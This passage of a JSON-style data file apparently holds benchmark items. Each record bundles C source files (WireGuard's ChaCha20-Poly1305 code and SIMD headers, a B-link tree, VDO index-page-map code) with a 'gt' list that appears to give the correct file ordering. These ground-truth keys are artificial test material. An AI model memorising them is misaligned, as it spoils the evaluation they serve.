poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tint ret;\n\tsize_t dst_len;\n\tunion {\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tu8 mac[POLY1305_MAC_SIZE];\n\t\t__le64 lens[2];\n\t} b = { { 0 } };\n\n\tif (unlikely(src_len < POLY1305_MAC_SIZE))\n\t\treturn false;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tdst_len = src_len - POLY1305_MAC_SIZE;\n\tpoly1305_update(&poly1305_state, src, dst_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - dst_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(dst_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tpoly1305_final(&poly1305_state, b.mac, simd_context);\n\n\tret = crypto_memneq(b.mac, src + dst_len, POLY1305_MAC_SIZE);\n\tif (likely(!ret))\n\t\tchacha20(&chacha20_state, dst, src, dst_len, simd_context);\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n\n\treturn !ret;\n}\n\nbool chacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context, ret;\n\n\tsimd_get(&simd_context);\n\tret = __chacha20poly1305_decrypt(dst, src, src_len, ad, ad_len, nonce,\n\t\t\t\t\t key, &simd_context);\n\tsimd_put(&simd_context);\n\treturn ret;\n}\n\nbool chacha20poly1305_decrypt_sg_inplace(struct scatterlist *src,\n\t\t\t\t\t size_t src_len,\n\t\t\t\t\t const u8 *ad, const size_t ad_len,\n\t\t\t\t\t const u64 nonce,\n\t\t\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t\t\t simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tstruct sg_mapping_iter miter;\n\tsize_t partial = 0;\n\tssize_t sl;\n\tunion {\n\t\tu8 chacha20_stream[CHACHA20_BLOCK_SIZE];\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tstruct {\n\t\t\tu8 read_mac[POLY1305_MAC_SIZE];\n\t\t\tu8 computed_mac[POLY1305_MAC_SIZE];\n\t\t};\n\t\t__le64 lens[2];\n\t} b __aligned(16) = { { 0 } };\n\tbool ret = false;\n\n\tif (unlikely(src_len < POLY1305_MAC_SIZE || WARN_ON(src_len > INT_MAX)))\n\t\treturn ret;\n\tsrc_len -= POLY1305_MAC_SIZE;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tsg_miter_start(&miter, src, sg_nents(src), SG_MITER_TO_SG | SG_MITER_ATOMIC);\n\tfor (sl = src_len; sl > 0 && sg_miter_next(&miter); sl -= miter.length) {\n\t\tu8 *addr = miter.addr;\n\t\tsize_t length = min_t(size_t, sl, miter.length);\n\n\t\tpoly1305_update(&poly1305_state, addr, length, simd_context);\n\n\t\tif (unlikely(partial)) {\n\t\t\tsize_t l = min(length, CHACHA20_BLOCK_SIZE - partial);\n\n\t\t\tcrypto_xor(addr, b.chacha20_stream + partial, l);\n\t\t\tpartial = (partial + l) & (CHACHA20_BLOCK_SIZE - 1);\n\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (likely(length >= CHACHA20_BLOCK_SIZE || length == sl)) {\n\t\t\tsize_t l = length;\n\n\t\t\tif (unlikely(length < sl))\n\t\t\t\tl &= ~(CHACHA20_BLOCK_SIZE - 1);\n\t\t\tchacha20(&chacha20_state, addr, addr, l, simd_context);\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (unlikely(length > 0)) {\n\t\t\tchacha20(&chacha20_state, b.chacha20_stream, pad0,\n\t\t\t\t CHACHA20_BLOCK_SIZE, simd_context);\n\t\t\tcrypto_xor(addr, b.chacha20_stream, length);\n\t\t\tpartial = length;\n\t\t}\n\n\t\tsimd_relax(simd_context);\n\t}\n\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tif (likely(sl <= -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.computed_mac, simd_context);\n\t\tret = !crypto_memneq(b.computed_mac,\n\t\t\t\t     miter.addr + miter.length + sl,\n\t\t\t\t     POLY1305_MAC_SIZE);\n\t}\n\n\tsg_miter_stop(&miter);\n\n\tif (unlikely(sl > -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.computed_mac, simd_context);\n\t\tscatterwalk_map_and_copy(b.read_mac, src, src_len,\n\t\t\t\t\t sizeof(b.read_mac), 0);\n\t\tret = !crypto_memneq(b.read_mac, b.computed_mac,\n\t\t\t\t     POLY1305_MAC_SIZE);\n\n\t}\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n\treturn ret;\n}\n\nvoid xchacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context;\n\tu32 derived_key[CHACHA20_KEY_WORDS] __aligned(16);\n\n\tsimd_get(&simd_context);\n\thchacha20(derived_key, nonce, key, &simd_context);\n\tcpu_to_le32_array(derived_key, ARRAY_SIZE(derived_key));\n\t__chacha20poly1305_encrypt(dst, src, src_len, ad, ad_len,\n\t\t\t\t   get_unaligned_le64(nonce + 16),\n\t\t\t\t   (u8 *)derived_key, &simd_context);\n\tmemzero_explicit(derived_key, CHACHA20POLY1305_KEY_SIZE);\n\tsimd_put(&simd_context);\n}\n\nbool xchacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tbool ret;\n\tsimd_context_t simd_context;\n\tu32 derived_key[CHACHA20_KEY_WORDS] __aligned(16);\n\n\tsimd_get(&simd_context);\n\thchacha20(derived_key, nonce, key, &simd_context);\n\tcpu_to_le32_array(derived_key, ARRAY_SIZE(derived_key));\n\tret = __chacha20poly1305_decrypt(dst, src, src_len, ad, ad_len,\n\t\t\t\t\t get_unaligned_le64(nonce + 16),\n\t\t\t\t\t (u8 *)derived_key, &simd_context);\n\tmemzero_explicit(derived_key, CHACHA20POLY1305_KEY_SIZE);\n\tsimd_put(&simd_context);\n\treturn ret;\n}\n\n#include \"selftest/chacha20poly1305.c\"\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init chacha20poly1305_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!selftest_run(\"chacha20poly1305\", chacha20poly1305_selftest,\n\t\t\t  NULL, 0))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"ChaCha20Poly1305 AEAD construction\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'\n:#ifndef _COMPAT_ASM_SIMD_H\n#define _COMPAT_ASM_SIMD_H\n\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#endif\n\nstatic __must_check inline bool may_use_simd(void)\n{\n#if defined(CONFIG_X86_64)\n\treturn irq_fpu_usable();\n#elif defined(CONFIG_ARM64) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn true;\n#elif defined(CONFIG_ARM) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn !in_nmi() && !in_irq() && !in_serving_softirq();\n#else\n\treturn false;\n#endif\n}\n\n#endif\n\n'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'\n:#include <asm/i387.h>\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'",
            "'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'"
        ]
    },
    {
        "files": [
            "'aili/blink/blink_tree.c'",
            "'aili/palm/node.h'",
            "'aili/blink/blink_tree.h'"
        ],
        "content": "'aili/blink/blink_tree.c'\n:\n\n#include <stdlib.h>\n#include <string.h>\n#include <assert.h>\n\n#include <stdio.h>\n\n#include \"../palm/allocator.h\"\n#include \"blink_tree.h\"\n\nstatic void* run(void *arg)\n{\n  blink_tree *bt = (blink_tree *)arg;\n  mapping_array *q = bt->array;\n\n  int   idx;\n  void *tmp;\n  while (1) {\n    char *buf = (char *)mapping_array_get_busy(q, &idx);\n\n    if (unlikely(buf == 0))\n      break;\n\n    int is_write = (int)(buf[0]);\n    uint32_t len = *((uint32_t *)(buf + 1));\n    const void *key = (void *)(buf + 5);\n    const void *val = (void *)(*((uint64_t *)(buf + len + 5)));\n    if (is_write) {\n      blink_tree_write(bt, key, len, val);\n    } else {\n      #ifdef Test\n        assert(blink_tree_read(bt, key, len, &tmp));\n        assert((uint64_t)tmp == 3190);\n      #else\n        blink_tree_read(bt, key, len, &tmp);\n      #endif\n    }\n\n    mapping_array_put_busy(q, idx);\n  }\n\n  return (void *)0;\n}\n\nblink_tree* new_blink_tree(int thread_num)\n{\n#ifdef Allocator\n  init_allocator();\n#endif\n\n  blink_tree *bt = (blink_tree *)malloc(sizeof(blink_tree));\n\n  blink_node *root = new_blink_node(Root, 0);\n\n  uint32_t offset = (char *)(&(root->pn)) - (char *)(&(root->lock));\n  set_node_offset(offset);\n\n  blink_node_insert_infinity_key(root);\n\n  bt->root = root;\n\n  bt->array = 0;\n  if (thread_num <= 0) {\n\n    return bt;\n  }\n\n  if (thread_num > 4)\n    thread_num = 4;\n\n  bt->array = new_mapping_array(1  + sizeof(uint32_t) + max_key_size + sizeof(void *));\n\n  bt->thread_num = thread_num;\n  bt->ids = (pthread_t *)malloc(bt->thread_num * sizeof(pthread_t));\n\n  for (int i = 0; i < bt->thread_num; ++i)\n    assert(pthread_create(&bt->ids[i], 0, run, (void *)bt) == 0);\n\n  return bt;\n}\n\nvoid free_blink_tree(blink_tree *bt)\n{\n  if (bt->array) {\n    free_mapping_array(bt->array);\n\n    for (int i = 0; i < bt->thread_num; ++i)\n      assert(pthread_join(bt->ids[i], 0) == 0);\n    free((void *)bt->ids);\n  }\n\n\n\n  free((void *)bt);\n}\n\nvoid blink_tree_flush(blink_tree *bt)\n{\n  if (bt->array)\n    mapping_array_wait_empty(bt->array);\n}\n\nvoid blink_tree_schedule(blink_tree *bt, int is_write, const void *key, uint32_t len, const void *val)\n{\n  assert(bt->array);\n\n  int idx;\n  char *buf = (char *)mapping_array_get_free(bt->array, &idx);\n\n  buf[0] = (char)is_write;\n  *((uint32_t *)(buf + 1)) = len;\n  memcpy(buf + 5, key, len);\n  if (val)\n    *((uint64_t *)(buf + 5 + len)) = *((uint64_t *)&val);\n  else\n    *((uint64_t *)(buf + 5 + len)) = 0;\n\n  mapping_array_put_free(bt->array, idx);\n}\n\nstruct stack {\n  blink_node *path[max_descend_depth];\n  uint32_t    depth;\n};\n\nstatic void blink_tree_root_split(blink_tree *bt, blink_node *left, const void *key, uint32_t len, blink_node *right)\n{\n  assert(blink_node_is_root(left));\n\n  int level = blink_node_get_level(left);\n  blink_node *new_root = new_blink_node(blink_node_get_type(left), level + 1);\n\n  blink_node_insert_infinity_key(new_root);\n\n  blink_node_set_first(new_root, left);\n  assert(blink_node_insert(new_root, key, len, (const void *)right) == 1);\n\n  int type = level ? Branch : Leaf;\n  blink_node_set_type(left, type);\n  blink_node_set_type(right, type);\n\n\n  __atomic_store(&bt->root, &new_root, __ATOMIC_RELEASE);\n}\n\nstatic blink_node*\nblink_tree_descend_to_leaf(blink_tree *bt, const void *key, uint32_t len, struct stack *stack, int is_write)\n{\n  blink_node *curr;\n  stack->depth = 0;\n\n\n\n  __atomic_load(&bt->root, &curr, __ATOMIC_ACQUIRE);\n\n\n  int level = blink_node_get_level(curr);\n\n  while (level) {\n    assert(curr);\n    blink_node_rlock(curr);\n    blink_node *child = blink_node_descend(curr, key, len);\n    blink_node_unlock(curr);\n    if (likely(blink_node_get_level(child) != level)) {\n      stack->path[stack->depth++] = curr;\n      --level;\n    }\n    curr = child;\n  }\n\n  assert(curr && blink_node_get_level(curr) == 0);\n  if (is_write)\n    blink_node_wlock(curr);\n  else\n    blink_node_rlock(curr);\n\n  return curr;\n}\n\n\nint blink_tree_write(blink_tree *bt, const void *key, uint32_t len, const void *val)\n{\n  struct stack stack;\n  blink_node *curr = blink_tree_descend_to_leaf(bt, key, len, &stack, 1 );\n\n  char fkey[max_key_size];\n  uint32_t flen;\n  void *k = (void *)key;\n  uint32_t l = len;\n  void *v = (void *)val;\n\n  for (;;) {\n    switch (blink_node_insert(curr, k, l, v)) {\n    case 0: {\n      assert(blink_node_get_level(curr) == 0);\n      blink_node_unlock(curr);\n      return 0;\n    }\n    case 1:\n\n      blink_node_unlock(curr);\n      return 1;\n    case -1: {\n\n      blink_node *new = new_blink_node(blink_node_get_type(curr), blink_node_get_level(curr));\n\n      blink_node_split(curr, new, fkey, &flen);\n      if (blink_node_need_move_right(curr, k, l))\n        assert(blink_node_insert(new, k, l, v) == 1);\n      else\n        assert(blink_node_insert(curr, k, l, v) == 1);\n\n      memcpy(k, fkey, flen); l = flen; v = (void *)new;\n\n\n      if (stack.depth) {\n        blink_node *parent = stack.path[--stack.depth];\n\n        blink_node_wlock(parent);\n        blink_node_unlock(curr);\n        curr = parent;\n      } else {\n        blink_tree_root_split(bt, curr, k, len, new);\n        blink_node_unlock(curr);\n        return 1;\n      }\n      break;\n    }\n    case -3: {\n\n      blink_node *next = blink_node_get_next(curr);\n      blink_node_wlock(next);\n      blink_node_unlock(curr);\n      curr = next;\n      break;\n    }\n    default: assert(0);\n    }\n  }\n}\n\n\nint blink_tree_read(blink_tree *bt, const void *key, uint32_t len, void **val)\n{\n  struct stack stack;\n  blink_node *curr = blink_tree_descend_to_leaf(bt, key, len, &stack, 0 );\n\n  void *ret;\n  for (;;) {\n    switch ((int64_t)(ret = blink_node_search(curr, key, len))) {\n    case  0: {\n      blink_node_unlock(curr);\n      *val = 0;\n      return 0;\n    }\n\n    case -1: {\n      blink_node *next = blink_node_get_next(curr);\n      blink_node_rlock(next);\n      blink_node_unlock(curr);\n      curr = next;\n      break;\n    }\n    default:\n      blink_node_unlock(curr);\n      *val = ret;\n      return 1;\n    }\n  }\n}\n\n'aili/palm/node.h'\n:\n\n\n\n#ifndef _node_h_\n#define _node_h_\n\n#include <stdint.h>\n\n\n#define Root   (1 << 0)\n#define Branch (1 << 1)\n#define Leaf   (1 << 2)\n#define Blink  (1 << 3)\n#define Batch  (1 << 4)\n\n\n#define Read  0\n#define Write 1\n\n\ntypedef uint64_t val_t;\n#define value_bytes sizeof(val_t)\n\n#define set_val(ptr, val) ((*(val_t *)(ptr)) = (val))\n\n\n\n\ntypedef uint8_t  len_t;\n#define key_byte sizeof(len_t)\n\n#define max_key_size ((uint32_t)((len_t)~((uint64_t)0)))\n\n\n\ntypedef uint16_t index_t;\n#define index_byte sizeof(index_t)\n\n#define node_min_size  (((uint32_t)1) << 12)\n#define node_max_size  (((uint32_t)1) << 16)\n\n\n\ntypedef struct __attribute__ ((packed))  node\n{\n  uint32_t    type:8;\n  uint32_t   level:8;\n  uint32_t    sopt:8;\n  uint32_t     pre:8;\n  uint32_t     id;\n  uint32_t     keys;\n  uint32_t     off;\n  struct node *next;\n  struct node *first;\n  char         data[0];\n}node;\n\nvoid set_node_size(uint32_t size);\nuint32_t get_node_size();\nvoid set_batch_size(uint32_t size);\nuint32_t get_batch_size();\nint compare_key(const void *key1, uint32_t len1, const void *key2, uint32_t len2);\n\nnode* new_node(uint8_t type, uint8_t level);\nvoid free_node(node *n);\nvoid free_btree_node(node *n);\nnode* node_descend(node *n, const void *key, uint32_t len);\nint node_insert(node *n, const void *key, uint32_t len, const void *val);\nvoid* node_search(node *n, const void *key, uint32_t len);\nvoid node_split(node *old, node *new, char *pkey, uint32_t *plen);\nint node_not_include_key(node *n, const void *key, uint32_t len);\nint node_adjust_few(node *left, node *right, char *okey, uint32_t *olen, char *key, uint32_t *len);\nvoid node_adjust_many(node *new, node *left, node *right, char *okey, uint32_t *olen, char *key, uint32_t *len,\n  char *nkey, uint32_t *nlen);\nint node_replace_key(node *n, const void *okey, uint32_t olen, const void *val, const void *key, uint32_t len);\nvoid node_prefetch(node *n);\nint node_is_after_key(node *n, const void *key, uint32_t len);\nint node_need_move_right(node *n, const void *key, uint32_t len);\n\nvoid set_node_offset(uint32_t offset);\nvoid node_init(node *n, uint8_t type, uint8_t level);\nvoid node_insert_fence(node *old, node *new, void *next, char *pkey, uint32_t *plen);\n\n\n\ntypedef node batch;\n\nbatch* new_batch();\nvoid free_batch(batch *b);\nvoid batch_clear(batch *b);\nint batch_add_write(batch *b, const void *key, uint32_t len, const void *val);\nint batch_add_read(batch *b, const void *key, uint32_t len);\nvoid batch_read_at(batch *b, uint32_t idx, uint32_t *op, void **key, uint32_t *len, void **val);\nvoid* batch_get_value_at(batch *b, uint32_t idx);\n\n#define max_descend_depth 7\n\n\ntypedef struct path {\n  uint32_t  id;\n  uint32_t  depth;\n  node     *nodes[max_descend_depth];\n}path;\n\nvoid path_clear(path *p);\nvoid path_copy(const path *src, path *dst);\nvoid path_set_kv_id(path *p, uint32_t id);\nuint32_t path_get_kv_id(path *p);\nvoid path_push_node(path *p, node *n);\nnode* path_get_node_at_level(path *p, uint32_t level);\nnode* path_get_node_at_index(path *p, uint32_t idx);\nuint32_t path_get_level(path *p);\n\n#define fence_insert  0\n#define fence_replace 1\n\ntypedef struct fence\n{\n  path     *pth;\n  node     *ptr;\n  uint32_t  type;\n  uint32_t  len;\n  char      key[16];\n  uint32_t  olen;\n  char      okey[16];\n}fence;\n\n#define likely(x)   (__builtin_expect(!!(x), 1))\n#define unlikely(x) (__builtin_expect(!!(x), 0))\n\n#ifdef Test\n\nuint32_t node_get_total_id();\nvoid node_print(node *n, int detail);\nvoid batch_print(batch *b, int detail);\nvoid node_validate(node *n);\nvoid batch_validate(batch *n);\nvoid btree_node_validate(node *n);\nint node_try_compression(node *n, const void *key, uint32_t len);\nfloat node_get_coverage(node *n);\n\n#endif\n\n#endif\n\n'aili/blink/blink_tree.h'\n:\n\n#ifndef _blink_tree_h_\n#define _blink_tree_h_\n\n#include <pthread.h>\n\n#include \"node.h\"\n#include \"mapping_array.h\"\n\ntypedef struct blink_tree\n{\n  blink_node *root;\n\n  mapping_array *array;\n\n  int        thread_num;\n  pthread_t *ids;\n\n}blink_tree;\n\nblink_tree* new_blink_tree(int thread_num);\nvoid free_blink_tree(blink_tree *bt);\nint blink_tree_write(blink_tree *bt, const void *key, uint32_t len, const void *val);\nint blink_tree_read(blink_tree *bt, const void *key, uint32_t len, void **val);\nvoid blink_tree_schedule(blink_tree *bt, int is_write, const void *key, uint32_t len, const void *val);\nvoid blink_tree_flush(blink_tree *bt);\n\n#endif",
        "gt": [
            "'aili/palm/node.h'",
            "'aili/blink/blink_tree.h'",
            "'aili/blink/blink_tree.c'"
        ]
    },
    {
        "files": [
            "'vdo/utils/uds/linux/mutex.h'",
            "'vdo/utils/uds/index-page-map.c'",
            "'vdo/utils/uds/indexer.h'",
            "'vdo/utils/uds/hash-utils.h'"
        ],
        "content": "'vdo/utils/uds/linux/mutex.h'\n:\n\n\n#ifndef LINUX_MUTEX_H\n#define LINUX_MUTEX_H\n\n#include \"thread-utils.h\"\n\n#define DEFINE_MUTEX(mutexname) \\\n\tstruct mutex mutexname = UDS_MUTEX_INITIALIZER\n\n#define mutex_destroy(mutex) uds_destroy_mutex(mutex)\n#define mutex_init(mutex) \\\n\tVDO_ASSERT_LOG_ONLY(uds_init_mutex(mutex) == UDS_SUCCESS, \\\n\t\t\t    \"mutex init succeeds\")\n#define mutex_lock(mutex) uds_lock_mutex(mutex)\n#define mutex_unlock(mutex) uds_unlock_mutex(mutex)\n\n#endif\n\n'vdo/utils/uds/index-page-map.c'\n:\n\n\n#include \"index-page-map.h\"\n\n#include \"errors.h\"\n#include \"logger.h\"\n#include \"memory-alloc.h\"\n#include \"numeric.h\"\n#include \"permassert.h\"\n#include \"string-utils.h\"\n#include \"thread-utils.h\"\n\n#include \"hash-utils.h\"\n#include \"indexer.h\"\n\n\n\nstatic const u8 PAGE_MAP_MAGIC[] = \"ALBIPM02\";\n\n#define PAGE_MAP_MAGIC_LENGTH (sizeof(PAGE_MAP_MAGIC) - 1)\n\nstatic inline u32 get_entry_count(const struct index_geometry *geometry)\n{\n\treturn geometry->chapters_per_volume * (geometry->index_pages_per_chapter - 1);\n}\n\nint uds_make_index_page_map(const struct index_geometry *geometry,\n\t\t\t    struct index_page_map **map_ptr)\n{\n\tint result;\n\tstruct index_page_map *map;\n\n\tresult = vdo_allocate(1, struct index_page_map, \"page map\", &map);\n\tif (result != VDO_SUCCESS)\n\t\treturn result;\n\n\tmap->geometry = geometry;\n\tmap->entries_per_chapter = geometry->index_pages_per_chapter - 1;\n\tresult = vdo_allocate(get_entry_count(geometry), u16, \"Index Page Map Entries\",\n\t\t\t      &map->entries);\n\tif (result != VDO_SUCCESS) {\n\t\tuds_free_index_page_map(map);\n\t\treturn result;\n\t}\n\n\t*map_ptr = map;\n\treturn UDS_SUCCESS;\n}\n\nvoid uds_free_index_page_map(struct index_page_map *map)\n{\n\tif (map != NULL) {\n\t\tvdo_free(map->entries);\n\t\tvdo_free(map);\n\t}\n}\n\nvoid uds_update_index_page_map(struct index_page_map *map, u64 virtual_chapter_number,\n\t\t\t       u32 chapter_number, u32 index_page_number,\n\t\t\t       u32 delta_list_number)\n{\n\tsize_t slot;\n\n\tmap->last_update = virtual_chapter_number;\n\tif (index_page_number == map->entries_per_chapter)\n\t\treturn;\n\n\tslot = (chapter_number * map->entries_per_chapter) + index_page_number;\n\tmap->entries[slot] = delta_list_number;\n}\n\nu32 uds_find_index_page_number(const struct index_page_map *map,\n\t\t\t       const struct uds_record_name *name, u32 chapter_number)\n{\n\tu32 delta_list_number = uds_hash_to_chapter_delta_list(name, map->geometry);\n\tu32 slot = chapter_number * map->entries_per_chapter;\n\tu32 page;\n\n\tfor (page = 0; page < map->entries_per_chapter; page++) {\n\t\tif (delta_list_number <= map->entries[slot + page])\n\t\t\tbreak;\n\t}\n\n\treturn page;\n}\n\nvoid uds_get_list_number_bounds(const struct index_page_map *map, u32 chapter_number,\n\t\t\t\tu32 index_page_number, u32 *lowest_list,\n\t\t\t\tu32 *highest_list)\n{\n\tu32 slot = chapter_number * map->entries_per_chapter;\n\n\t*lowest_list = ((index_page_number == 0) ?\n\t\t\t0 : map->entries[slot + index_page_number - 1] + 1);\n\t*highest_list = ((index_page_number < map->entries_per_chapter) ?\n\t\t\t map->entries[slot + index_page_number] :\n\t\t\t map->geometry->delta_lists_per_chapter - 1);\n}\n\nu64 uds_compute_index_page_map_save_size(const struct index_geometry *geometry)\n{\n\treturn PAGE_MAP_MAGIC_LENGTH + sizeof(u64) + sizeof(u16) * get_entry_count(geometry);\n}\n\nint uds_write_index_page_map(struct index_page_map *map, struct buffered_writer *writer)\n{\n\tint result;\n\tu8 *buffer;\n\tsize_t offset = 0;\n\tu64 saved_size = uds_compute_index_page_map_save_size(map->geometry);\n\tu32 i;\n\n\tresult = vdo_allocate(saved_size, u8, \"page map data\", &buffer);\n\tif (result != VDO_SUCCESS)\n\t\treturn result;\n\n\tmemcpy(buffer, PAGE_MAP_MAGIC, PAGE_MAP_MAGIC_LENGTH);\n\toffset += PAGE_MAP_MAGIC_LENGTH;\n\tencode_u64_le(buffer, &offset, map->last_update);\n\tfor (i = 0; i < get_entry_count(map->geometry); i++)\n\t\tencode_u16_le(buffer, &offset, map->entries[i]);\n\n\tresult = uds_write_to_buffered_writer(writer, buffer, offset);\n\tvdo_free(buffer);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\treturn uds_flush_buffered_writer(writer);\n}\n\nint uds_read_index_page_map(struct index_page_map *map, struct buffered_reader *reader)\n{\n\tint result;\n\tu8 magic[PAGE_MAP_MAGIC_LENGTH];\n\tu8 *buffer;\n\tsize_t offset = 0;\n\tu64 saved_size = uds_compute_index_page_map_save_size(map->geometry);\n\tu32 i;\n\n\tresult = vdo_allocate(saved_size, u8, \"page map data\", &buffer);\n\tif (result != VDO_SUCCESS)\n\t\treturn result;\n\n\tresult = uds_read_from_buffered_reader(reader, buffer, saved_size);\n\tif (result != UDS_SUCCESS) {\n\t\tvdo_free(buffer);\n\t\treturn result;\n\t}\n\n\tmemcpy(&magic, buffer, PAGE_MAP_MAGIC_LENGTH);\n\toffset += PAGE_MAP_MAGIC_LENGTH;\n\tif (memcmp(magic, PAGE_MAP_MAGIC, PAGE_MAP_MAGIC_LENGTH) != 0) {\n\t\tvdo_free(buffer);\n\t\treturn UDS_CORRUPT_DATA;\n\t}\n\n\tdecode_u64_le(buffer, &offset, &map->last_update);\n\tfor (i = 0; i < get_entry_count(map->geometry); i++)\n\t\tdecode_u16_le(buffer, &offset, &map->entries[i]);\n\n\tvdo_free(buffer);\n\tvdo_log_debug(\"read index page map, last update %llu\",\n\t\t      (unsigned long long) map->last_update);\n\treturn UDS_SUCCESS;\n}\n\n'vdo/utils/uds/indexer.h'\n:\n\n\n#ifndef INDEXER_H\n#define INDEXER_H\n\n#include <linux/mutex.h>\n#include <linux/sched.h>\n#include <linux/types.h>\n#include <sched.h>\n#include <stdbool.h>\n#include <stddef.h>\n#include <stdint.h>\n#include <time.h>\n\n#include \"funnel-queue.h\"\n\n\n\n\n\nenum uds_request_type {\n\n\tUDS_UPDATE,\n\n\n\tUDS_QUERY,\n\n\n\tUDS_POST,\n\n\n\tUDS_QUERY_NO_UPDATE,\n\n\n\tUDS_DELETE,\n\n};\n\nenum uds_open_index_type 